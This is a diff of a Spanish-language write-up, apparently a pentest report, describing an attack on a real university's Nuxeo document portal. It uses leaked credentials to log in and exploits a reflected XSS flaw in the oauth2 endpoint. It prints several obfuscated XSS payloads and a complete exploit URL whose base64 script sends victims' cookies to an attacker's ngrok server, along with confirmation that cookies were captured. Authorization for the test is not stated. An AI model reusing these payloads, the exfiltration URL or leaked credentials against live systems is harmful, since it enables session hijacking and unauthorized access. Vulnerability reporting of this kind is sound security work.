@@ -8,7 +8,8 @@ https://documental.portaloas.udistrital.edu.co/nuxeo/login.jsp?requestedUrl=ui%2
 ```
 Allí se cargó correctamente la interfaz gráfica de inicio de sesión de Nuxeo.
 
-![Interfaz gráfica login Nuxeo](/images/name/image-WOanJdHL.png)
+![Interfaz gráfica login Nuxeo]
+<img width="1752" height="937" alt="image" src="https://github.com/user-attachments/assets/6316a8ab-0a70-4b94-bc33-2ea9f47a1875" />
 
 Se utilizaron credenciales filtradas y aún válidas para iniciar sesión:
 
@@ -17,7 +18,8 @@ Se utilizaron credenciales filtradas y aún válidas para iniciar sesión:
 
 El navegador (Google Chrome) advirtió que dichas credenciales han sido comprometidas en filtraciones previas.
 
-![Advertencia de Chrome sobre credenciales filtradas](/images/name/image-jJVecXAH.png)
+![Advertencia de Chrome sobre credenciales filtradas]
+<img width="1800" height="911" alt="image" src="https://github.com/user-attachments/assets/402a25ec-b319-44db-bc1f-56ebe7b54c7b" />
 
 ---
 
@@ -25,7 +27,9 @@ El navegador (Google Chrome) advirtió que dichas credenciales han sido comprome
 
 Una vez autenticado, se identificó que la plataforma ejecuta el sistema **Nuxeo Web Engine**.
 
-![Interfaz Nuxeo Web Engine](/images/name/image-bCg4hNS1.png)
+![Interfaz Nuxeo Web Engine]
+<img width="1471" height="553" alt="image" src="https://github.com/user-attachments/assets/43358b1a-3560-4307-a659-537eee08c5c3" />
+
 
 Aunque no se logró identificar con exactitud la versión del sistema, se realizó una enumeración de directorios que reveló rutas relacionadas con OAuth, en particular:
 ```
@@ -34,7 +38,9 @@ Aunque no se logró identificar con exactitud la versión del sistema, se realiz
 
 OAuth (Open Authorization) es un protocolo estándar que permite a las aplicaciones obtener acceso limitado a cuentas de usuario sin exponer las credenciales.
 
-![Enumeración de directorios relevantes](/images/name/image-GTzFZFl1.png)
+![Enumeración de directorios relevantes]
+<img width="1164" height="658" alt="image" src="https://github.com/user-attachments/assets/368b467e-d574-4ccf-90ae-74314197e228" />
+
 
 ---
 
@@ -47,7 +53,9 @@ Con base en los resultados anteriores, se investigaron vulnerabilidades conocida
 **Referencia oficial:**
 https://securitylab.github.com/advisories/GHSL-2021-072-nuxeo
 
-![Referencia CVE](/images/name/image-oXBJZByq.png)
+![Referencia CVE]
+<img width="1282" height="772" alt="image" src="https://github.com/user-attachments/assets/f50e3af5-ca7f-4186-9b2c-9118fa46730e" />
+
 
 **Endpoint vulnerable:**
 ```
@@ -65,7 +73,8 @@ https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/%3Cimg%20src%20
 
 El resultado fue exitoso, mostrando una alerta con el dominio del sitio.
 
-![XSS exitoso con alert](/images/name/image-KGStg2qU.png)
+![XSS exitoso con alert]
+<img width="1394" height="348" alt="image" src="https://github.com/user-attachments/assets/2427dcb3-ee51-43bf-a2c6-835bb8e3ad17" />
 
 ---
 
@@ -85,21 +94,21 @@ Sin embargo, este método no funcionó en el entorno evaluado. Se intentaron var
 Se exploraron varias técnicas para evadir filtros o mejorar la ejecución del código inyectado:
 
 - **Payload 1: onerror + eval con Base64**
-
+```
 <img src=x onerror=eval(atob("YWxlcnQoJ1hTUycp"))>
-
+```
 > Decodificado: `alert('XSS')`
 
 - **Payload 2: SVG con evento onload**
-
+```
 <svg onload=eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))>
-
+```
 > Decodificado: `alert(document.cookie)`
 
 - **Payload 3: iframe con srcdoc**
-
+```
 <iframe srcdoc="<script>alert(1)</script>"> ```
-
+```
 
 **Payload 4: script tag directo**
 ```
@@ -172,11 +181,15 @@ Se ejecutó el siguiente payload XSS que realiza una petición hacia el servidor
 https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22aT1uZXcgSW1hZ2UoKTtpLnNyYz0iaHR0cHM6Ly9hNTZmYWE1ZDcyYjIubmdyb2stZnJlZS5hcHAvbG9nP2M9Iitkb2N1bWVudC5jb29raWU7%22))%3E/callback
 ```
 
-![Payload XSS apuntando al servidor atacante](/images/name/image-D8bfOXVj.png){width="auto"}
+![Payload XSS apuntando al servidor atacante]
+<img width="1741" height="194" alt="image" src="https://github.com/user-attachments/assets/96c65c03-9d6d-4919-9731-f41a839ee064" />
+
 
 La petición fue recibida exitosamente en el servidor del atacante.
 
-![Petición recibida en servidor atacante](/images/name/image-zSdZcElN.png){width="auto"}
+![Petición recibida en servidor atacante]
+<img width="1797" height="813" alt="image" src="https://github.com/user-attachments/assets/66461f11-69a3-4001-a4de-d4673f8c589d" />
+
 
 ---
 
@@ -184,7 +197,8 @@ La petición fue recibida exitosamente en el servidor del atacante.
 
 A pesar del error 404, se verificó que las cookies recibidas coincidían con aquellas no protegidas por las banderas `HttpOnly` ni `Secure`, lo que permite su exposición vía JavaScript.
 
-![Comparación entre cookies recibidas y cookies de la víctima](/images/name/image-ynoDslmW.png){width="auto"}
+![Comparación entre cookies recibidas y cookies de la víctima]
+<img width="1793" height="880" alt="image" src="https://github.com/user-attachments/assets/66c58d5a-bf4d-46f1-bff1-6d0b47247b1c" />
 
 
 
